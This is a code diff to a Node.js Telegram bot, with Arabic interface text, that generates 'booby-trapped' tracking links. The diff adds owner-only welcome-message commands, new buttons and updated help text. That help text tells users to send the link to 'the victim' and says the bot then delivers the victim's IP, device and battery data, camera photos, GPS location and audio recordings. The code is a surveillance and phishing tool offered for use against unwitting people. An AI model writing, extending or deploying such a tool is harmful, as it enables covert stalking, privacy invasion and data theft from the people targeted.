@@ -19,6 +19,12 @@ let stats = { linksOpened: 0, linksCreated: 0 };
 try { stats = JSON.parse(fs.readFileSync(STATS_FILE)); } catch(e) {}
 function saveStats() { fs.writeFileSync(STATS_FILE, JSON.stringify(stats)); }
 
+// Custom welcome message storage
+const SETTINGS_FILE = "./settings.json";
+let settings = { welcomeMsg: "" };
+try { settings = JSON.parse(fs.readFileSync(SETTINGS_FILE)); } catch(e) {}
+function saveSettings() { fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings)); }
+
 var cors = require('cors');
 var bodyParser = require('body-parser');
 const fetch = require('node-fetch');
@@ -237,10 +243,31 @@ bot.on('message', async (msg) => {
     return bot.editMessageText(`🏓 Pong! \`${ms}ms\``, { chat_id: chatId, message_id: m.message_id, parse_mode: "Markdown" });
   }
 
+  // /setwelcome — custom welcome message (owner only)
+  if (msg.text && msg.text.startsWith("/setwelcome ")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    settings.welcomeMsg = msg.text.replace("/setwelcome ", "").trim();
+    saveSettings();
+    return bot.sendMessage(chatId, `✅ تم تحديث رسالة الترحيب.`);
+  }
+
+  // /resetwelcome — reset to default
+  if (msg.text == "/resetwelcome") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    settings.welcomeMsg = "";
+    saveSettings();
+    return bot.sendMessage(chatId, `✅ تم إعادة رسالة الترحيب للافتراضية.`);
+  }
+
   // /start
   if (msg.text == "/start") {
-    const m = { reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "إنشاء رابط ملغم 🔗", callback_data: "crenew" }]] }) };
-    return bot.sendMessage(chatId, `مرحباً بڪ ${msg.chat.first_name}! 👋\n\nيمكنك استخدام هذا البوت لتعقب الأشخاص من خلال رابط بسيط.\n\nيجمع:\n📍 الموقع الجغرافي\n📱 معلومات الجهاز\n📷 صور الكاميرا\n🎙️ تسجيل صوتي\n🔋 معلومات البطارية\n\nاضغط /help لمزيد من المعلومات.`, m);
+    const keyboard = { reply_markup: JSON.stringify({ inline_keyboard: [
+      [{ text: "🔗 إنشاء رابط ملغم", callback_data: "crenew" }],
+      [{ text: "📖 المساعدة", callback_data: "help" }, { text: "🆔 ID الخاص بي", callback_data: "myid" }]
+    ]}) };
+    const welcome = settings.welcomeMsg ||
+      `مرحباً بڪ ${msg.chat.first_name}! 👋\n\nبوت تتبع الروابط الملغمة\n\nيجمع عند فتح الرابط:\n📍 الموقع الجغرافي\n📱 معلومات الجهاز والبطارية\n📷 صور الكاميرا\n🎙️ تسجيل صوتي\n🌐 بيانات الشبكة\n\n⚡ Powered by @Ye_x00`;
+    return bot.sendMessage(chatId, welcome, keyboard);
   }
 
   if (msg.text == "/create") {
@@ -248,9 +275,9 @@ bot.on('message', async (msg) => {
   }
 
   if (msg.text == "/help") {
-    let helpText = `📖 طريقة الاستخدام:\n\n1️⃣ اضغط "إنشاء رابط ملغم" أو /create\n2️⃣ أرسل الرابط الذي ستعيد التوجيه إليه\n3️⃣ ستحصل على رابطين:\n   • 🌐 رابط Cloudflare (يجمع كل المعلومات)\n   • 🖥️ رابط WebView\n4️⃣ أرسل الرابط للضحية\n5️⃣ عند الفتح تصلك فوراً:\n   - إشعار بالـ IP\n   - معلومات الجهاز\n   - صور الكاميرا\n   - الموقع الجغرافي\n   - تسجيل صوتي`;
+    let helpText = `📖 طريقة الاستخدام:\n\n1️⃣ اضغط "إنشاء رابط ملغم" أو /create\n2️⃣ أرسل الرابط الذي ستعيد التوجيه إليه\n3️⃣ ستحصل على رابطين:\n   • 🌐 Cloudflare (يجمع كل شيء)\n   • 🖥️ WebView\n4️⃣ أرسل الرابط للضحية\n\n📥 عند الفتح يصلك:\n   ⚡ إشعار فوري بالـ IP\n   📱 معلومات الجهاز والبطارية\n   📷 صور الكاميرا\n   📍 الموقع (GPS أو IP)\n   🎙️ تسجيل صوتي\n\n⚡ Powered by @Ye_x00`;
     if (chatId === BOT_OWNER) {
-      helpText += `\n\n📌 أوامر المالك:\n/stats - إحصائيات البوت\n/users - قائمة المستخدمين\n/banned - قائمة المحجوبين\n/ban [id] - حجب مستخدم\n/unban [id] - رفع الحجب\n/deleteuser [id] - حذف مستخدم\n/clearusers - مسح كل المستخدمين\n/link [url] - إنشاء رابط سريع\n/broadcast - إرسال للجميع\n/ping - اختبار سرعة البوت\n\n💡 للرد على مستخدم: اضغط زر "📩 رد" على رسالته`;
+      helpText += `\n\n━━━━━━━━━━━━━━━━\n📌 أوامر المالك:\n/stats — إحصائيات البوت\n/users — قائمة المستخدمين\n/banned — المحجوبون\n/ban [id] — حجب مستخدم\n/unban [id] — رفع الحجب\n/deleteuser [id] — حذف مستخدم\n/clearusers — مسح الكل\n/link [url] — رابط سريع\n/broadcast — إرسال للجميع\n/setwelcome [نص] — تخصيص رسالة البداية\n/resetwelcome — إعادة الافتراضية\n/ping — اختبار السرعة\n\n💡 رد على مستخدم: زر 📩 على رسالته`;
     }
     return bot.sendMessage(chatId, helpText);
   }
@@ -265,6 +292,15 @@ bot.on('callback_query', async function(callbackQuery) {
 
   if (data === "crenew") {
     return createNew(chatId);
+  }
+
+  if (data === "help") {
+    let helpText = `📖 طريقة الاستخدام:\n\n1️⃣ اضغط "إنشاء رابط ملغم" أو /create\n2️⃣ أرسل الرابط للتوجيه إليه\n3️⃣ احصل على رابطين:\n   • 🌐 Cloudflare (يجمع كل شيء)\n   • 🖥️ WebView\n4️⃣ أرسله للضحية\n\n📥 يصلك فوراً:\n   ⚡ IP الضحية\n   📱 بيانات الجهاز والبطارية\n   📷 صور الكاميرا\n   📍 الموقع (GPS أو IP)\n   🎙️ تسجيل صوتي\n\n⚡ Powered by @Ye_x00`;
+    return bot.sendMessage(chatId, helpText);
+  }
+
+  if (data === "myid") {
+    return bot.sendMessage(chatId, `🆔 الـ ID الخاص بك:\n\`${chatId}\``, { parse_mode: "Markdown" });
   }
 
   // Reply button: reply:USERID
